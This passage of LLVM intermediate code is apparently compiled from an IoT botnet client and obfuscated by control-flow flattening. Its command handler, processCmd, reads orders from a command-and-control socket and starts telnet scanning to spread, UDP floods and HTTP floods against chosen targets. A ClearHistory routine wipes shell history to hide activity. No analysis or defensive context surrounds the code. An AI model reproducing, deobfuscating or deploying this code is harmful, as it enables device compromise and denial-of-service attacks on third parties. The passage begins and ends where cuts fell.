  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.303, i32 0, i32 0), i8* %31, i8* %32, i8* %33, i8* %38) #5
  %40 = call i32 @fork() #5
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -2127539364, i32 -979313474
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1594617007, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #5
  %48 = icmp sgt i64 %46, %47
  %49 = select i1 %48, i32 118438102, i32 -2054392433
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 64683658, i32 1111014578
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 1111014578, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1594617007, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 1443530950, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 -169034690, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %44, %43, %29, %24, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.304, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2066246491, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2066246491, label %first
    i32 -1101035385, label %38
    i32 -1053507113, label %39
    i32 -2078354092, label %46
    i32 1579548473, label %53
    i32 1989130249, label %60
    i32 -1492223445, label %61
    i32 1745516934, label %65
    i32 -925223879, label %66
    i32 2110368810, label %70
    i32 396718118, label %72
    i32 -2036744116, label %76
    i32 248385415, label %77
    i32 1676970856, label %78
    i32 655698738, label %79
    i32 1878255798, label %84
    i32 195027648, label %99
    i32 941761566, label %102
    i32 1777682890, label %103
    i32 1484120125, label %110
    i32 -1885262237, label %114
    i32 1041489703, label %115
    i32 -910913304, label %118
    i32 149140803, label %125
    i32 1996948500, label %129
    i32 513469914, label %132
    i32 872431308, label %144
    i32 84225855, label %149
    i32 1743135954, label %150
    i32 104697910, label %151
    i32 1990991143, label %158
    i32 1862689817, label %162
    i32 1777650912, label %169
    i32 -981708967, label %176
    i32 -1962309709, label %177
    i32 761351504, label %181
    i32 -920198010, label %182
    i32 1082779708, label %205
    i32 1528988278, label %212
    i32 193131318, label %216
    i32 -34502846, label %223
    i32 197803314, label %230
    i32 -108039396, label %237
    i32 1778056082, label %244
    i32 -108567682, label %248
    i32 -1182634395, label %255
    i32 72011937, label %256
    i32 1636521961, label %275
    i32 -1571352082, label %280
    i32 -2109450667, label %281
    i32 2146177821, label %286
    i32 615076660, label %289
    i32 -1697265101, label %293
    i32 1389412730, label %297
    i32 1096340514, label %304
    i32 -448227752, label %306
    i32 1465020596, label %307
    i32 -126573585, label %311
    i32 1745869110, label %312
    i32 2023738123, label %319
    i32 -189282349, label %320
    i32 1892520713, label %327
    i32 -1197996500, label %331
    i32 -607136910, label %338
    i32 -266830389, label %345
    i32 -991890740, label %349
    i32 -1399182682, label %356
    i32 463756394, label %360
    i32 -272816758, label %367
    i32 -1768333714, label %368
    i32 -1659865929, label %386
    i32 -1781377485, label %391
    i32 -875481834, label %392
    i32 1357303887, label %396
    i32 2101906746, label %401
    i32 -207029674, label %402
    i32 1426723691, label %407
    i32 -24155700, label %410
    i32 -909830673, label %414
    i32 2134970254, label %418
    i32 -1662493175, label %426
    i32 2064377113, label %428
    i32 583024968, label %429
    i32 -1891159667, label %433
    i32 -1151789594, label %434
    i32 -1673518874, label %442
    i32 -1779248960, label %443
    i32 -860049600, label %450
    i32 -1040496169, label %454
    i32 -871583833, label %461
    i32 880812261, label %468
    i32 -1520970950, label %469
    i32 112341942, label %485
    i32 -1664722865, label %488
    i32 409472675, label %492
    i32 -1739971781, label %496
    i32 1208441849, label %500
    i32 -638772049, label %502
    i32 -191339001, label %503
    i32 1005736290, label %507
    i32 -1451360468, label %508
    i32 1422937177, label %512
    i32 -357716732, label %513
    i32 -1956987039, label %520
    i32 1011951702, label %521
    i32 1738716214, label %528
    i32 -6309486, label %529
    i32 1349913524, label %534
    i32 -764251851, label %541
    i32 -743840768, label %549
    i32 -2090728146, label %557
    i32 -2005087427, label %558
    i32 1577010847, label %561
    i32 -2029395316, label %565
    i32 -1215762256, label %566
    i32 -804920297, label %567
    i32 743770084, label %568
    i32 51445622, label %575
    i32 1457427420, label %576
    i32 320025222, label %583
    i32 1814389672, label %587
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp ne i32 %.reload, 0
  %37 = select i1 %36, i32 -1053507113, i32 -1101035385
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.306, i32 0, i32 0)) #9
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 104697910, i32 -2078354092
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @strcmp(i8* %49, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0)) #9
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1777682890, i32 1579548473
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = call i32 @fork() #5
  store i32 %54, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %55 = call i64 @sysconf(i32 84) #5
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 1
  %59 = select i1 %58, i32 1989130249, i32 -1492223445
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 500, i32* %8, align 4
  store i32 -1492223445, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = icmp sge i32 %62, 2
  %64 = select i1 %63, i32 1745516934, i32 -925223879
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1000, i32* %8, align 4
  store i32 -925223879, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %5, align 4
  %68 = icmp ugt i32 %67, 0
  %69 = select i1 %68, i32 2110368810, i32 396718118
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  %75 = select i1 %74, i32 -2036744116, i32 248385415
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1676970856, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 655698738, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %7, align 4
  %82 = icmp slt i32 %80, %81
  %83 = select i1 %82, i32 1878255798, i32 941761566
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i64 @time(i64* null) #5
  %86 = call i32 @getpid() #5
  %87 = sext i32 %86 to i64
  %88 = xor i64 %85, %87
  %89 = call i32 @getppid() #5
  %90 = sext i32 %89 to i64
  %91 = add nsw i64 %88, %90
  %92 = trunc i64 %91 to i32
  call void @srand(i32 %92) #5
  %93 = call i64 @time(i64* null) #5
  %94 = call i32 @getpid() #5
  %95 = sext i32 %94 to i64
  %96 = xor i64 %93, %95
  %97 = trunc i64 %96 to i32
  call void @init_rand(i32 %97)
  %98 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %98)
  call void @_exit(i32 0) #11
  unreachable

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %6, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %6, align 4
  store i32 655698738, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1777682890, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8**, i8*** %4, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  %106 = load i8*, i8** %105, align 8
  %107 = call i32 @strcmp(i8* %106, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i32 0, i32 0)) #9
  %108 = icmp ne i32 %107, 0
  %109 = select i1 %108, i32 -910913304, i32 1484120125
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* @scanPid, align 4
  %112 = icmp eq i32 %111, 0
  %113 = select i1 %112, i32 -1885262237, i32 1041489703
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* @scanPid, align 4
  %117 = call i32 @kill(i32 %116, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  store i32 -910913304, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8**, i8*** %4, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 1
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.309, i32 0, i32 0)) #9
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 1743135954, i32 149140803
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %3, align 4
  %127 = icmp slt i32 %126, 3
  %128 = select i1 %127, i32 1996948500, i32 513469914
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.310, i32 0, i32 0))
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @atoi(i8* %135) #9
  store i32 %136, i32* %9, align 4
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #9
  store i32 %140, i32* %10, align 4
  %141 = call i32 @listFork()
  %142 = icmp ne i32 %141, 0
  %143 = select i1 %142, i32 84225855, i32 872431308
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* @mainCommSock, align 4
  %146 = call i32 (i32, i8*, ...) @sockprintf(i32 %145, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.311, i32 0, i32 0))
  %147 = load i32, i32* %10, align 4
  %148 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %147, i32 %148)
  call void @_exit(i32 0) #11
  unreachable

; <label>:149:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  store i32 104697910, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i8**, i8*** %4, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 0
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @strcmp(i8* %154, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.312, i32 0, i32 0)) #9
  %156 = icmp ne i32 %155, 0
  %157 = select i1 %156, i32 1082779708, i32 1990991143
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %3, align 4
  %160 = icmp slt i32 %159, 6
  %161 = select i1 %160, i32 -981708967, i32 1862689817
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 3
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @atoi(i8* %165) #9
  %167 = icmp slt i32 %166, 1
  %168 = select i1 %167, i32 -981708967, i32 1777650912
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8**, i8*** %4, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 5
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 @atoi(i8* %172) #9
  %174 = icmp slt i32 %173, 1
  %175 = select i1 %174, i32 -981708967, i32 -1962309709
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = call i32 @listFork()
  %179 = icmp ne i32 %178, 0
  %180 = select i1 %179, i32 761351504, i32 -920198010
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 1
  %185 = load i8*, i8** %184, align 8
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 3
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191) #9
  %193 = trunc i32 %192 to i16
  %194 = load i8**, i8*** %4, align 8
  %195 = getelementptr inbounds i8*, i8** %194, i64 4
  %196 = load i8*, i8** %195, align 8
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 5
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #9
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 6
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @atoi(i8* %203) #9
  call void @sendHTTP(i8* %185, i8* %188, i16 zeroext %193, i8* %196, i32 %200, i32 %204)
  call void @exit(i32 0) #12
  unreachable

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 0
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i32 0, i32 0)) #9
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -189282349, i32 1528988278
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i32, i32* %3, align 4
  %214 = icmp slt i32 %213, 6
  %215 = select i1 %214, i32 -1182634395, i32 193131318
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8**, i8*** %4, align 8
  %218 = getelementptr inbounds i8*, i8** %217, i64 3
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @atoi(i8* %219) #9
  %221 = icmp eq i32 %220, -1
  %222 = select i1 %221, i32 -1182634395, i32 -34502846
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 2
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #9
  %228 = icmp eq i32 %227, -1
  %229 = select i1 %228, i32 -1182634395, i32 197803314
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 4
  %233 = load i8*, i8** %232, align 8
  %234 = call i32 @atoi(i8* %233) #9
  %235 = icmp eq i32 %234, -1
  %236 = select i1 %235, i32 -1182634395, i32 -108039396
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 4
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @atoi(i8* %240) #9
  %242 = icmp sgt i32 %241, 1024
  %243 = select i1 %242, i32 -1182634395, i32 1778056082
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %3, align 4
  %246 = icmp eq i32 %245, 6
  %247 = select i1 %246, i32 -108567682, i32 72011937
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 5
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 @atoi(i8* %251) #9
  %253 = icmp slt i32 %252, 1
  %254 = select i1 %253, i32 -1182634395, i32 72011937
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i8**, i8*** %4, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 1
  %259 = load i8*, i8** %258, align 8
  store i8* %259, i8** %11, align 8
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 2
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #9
  store i32 %263, i32* %12, align 4
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 3
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @atoi(i8* %266) #9
  store i32 %267, i32* %13, align 4
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 4
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @atoi(i8* %270) #9
  store i32 %271, i32* %14, align 4
  %272 = load i32, i32* %3, align 4
  %273 = icmp eq i32 %272, 6
  %274 = select i1 %273, i32 1636521961, i32 -1571352082
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #9
  store i32 -2109450667, i32* %switchVar
  store i32 %279, i32* %.reg2mem2
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  store i32 -2109450667, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %15, align 4
  store i32 32, i32* %16, align 4
  %282 = load i8*, i8** %11, align 8
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %284 = icmp ne i8* %283, null
  %285 = select i1 %284, i32 2146177821, i32 1465020596
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  %287 = load i8*, i8** %11, align 8
  %288 = call i8* @strtok(i8* %287, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %288, i8** %17, align 8
  store i32 615076660, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i8*, i8** %17, align 8
  %291 = icmp ne i8* %290, null
  %292 = select i1 %291, i32 -1697265101, i32 -448227752
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = call i32 @listFork()
  %295 = icmp ne i32 %294, 0
  %296 = select i1 %295, i32 1096340514, i32 1389412730
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8*, i8** %17, align 8
  %299 = load i32, i32* %12, align 4
  %300 = load i32, i32* %13, align 4
  %301 = load i32, i32* %14, align 4
  %302 = load i32, i32* %15, align 4
  %303 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %298, i32 %299, i32 %300, i32 %301, i32 %302, i32 %303)
  call void @_exit(i32 0) #11
  unreachable

; <label>:304:                                    ; preds = %loopEntry
  %305 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %305, i8** %17, align 8
  store i32 615076660, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  store i32 2023738123, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = call i32 @listFork()
  %309 = icmp ne i32 %308, 0
  %310 = select i1 %309, i32 -126573585, i32 1745869110
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8*, i8** %11, align 8
  %314 = load i32, i32* %12, align 4
  %315 = load i32, i32* %13, align 4
  %316 = load i32, i32* %14, align 4
  %317 = load i32, i32* %15, align 4
  %318 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %313, i32 %314, i32 %315, i32 %316, i32 %317, i32 %318)
  call void @_exit(i32 0) #11
  unreachable

; <label>:319:                                    ; preds = %loopEntry
  store i32 -189282349, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i8**, i8*** %4, align 8
  %322 = getelementptr inbounds i8*, i8** %321, i64 0
  %323 = load i8*, i8** %322, align 8
  %324 = call i32 @strcmp(i8* %323, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.314, i32 0, i32 0)) #9
  %325 = icmp ne i32 %324, 0
  %326 = select i1 %325, i32 -1779248960, i32 1892520713
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i32, i32* %3, align 4
  %329 = icmp slt i32 %328, 6
  %330 = select i1 %329, i32 -272816758, i32 -1197996500
  store i32 %330, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 3
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #9
  %336 = icmp eq i32 %335, -1
  %337 = select i1 %336, i32 -272816758, i32 -607136910
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 2
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #9
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -272816758, i32 -266830389
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i32, i32* %3, align 4
  %347 = icmp sgt i32 %346, 5
  %348 = select i1 %347, i32 -991890740, i32 -1399182682
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 5
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #9
  %354 = icmp slt i32 %353, 0
  %355 = select i1 %354, i32 -272816758, i32 -1399182682
  store i32 %355, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i32, i32* %3, align 4
  %358 = icmp eq i32 %357, 7
  %359 = select i1 %358, i32 463756394, i32 -1768333714
  store i32 %359, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 6
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @atoi(i8* %363) #9
  %365 = icmp slt i32 %364, 1
  %366 = select i1 %365, i32 -272816758, i32 -1768333714
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  store i32 1814389672, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i8**, i8*** %4, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 1
  %371 = load i8*, i8** %370, align 8
  store i8* %371, i8** %18, align 8
  %372 = load i8**, i8*** %4, align 8
  %373 = getelementptr inbounds i8*, i8** %372, i64 2
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @atoi(i8* %374) #9
  store i32 %375, i32* %19, align 4
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 3
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @atoi(i8* %378) #9
  store i32 %379, i32* %20, align 4
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 4
  %382 = load i8*, i8** %381, align 8
  store i8* %382, i8** %21, align 8
  %383 = load i32, i32* %3, align 4
  %384 = icmp eq i32 %383, 7
  %385 = select i1 %384, i32 -1659865929, i32 -1781377485
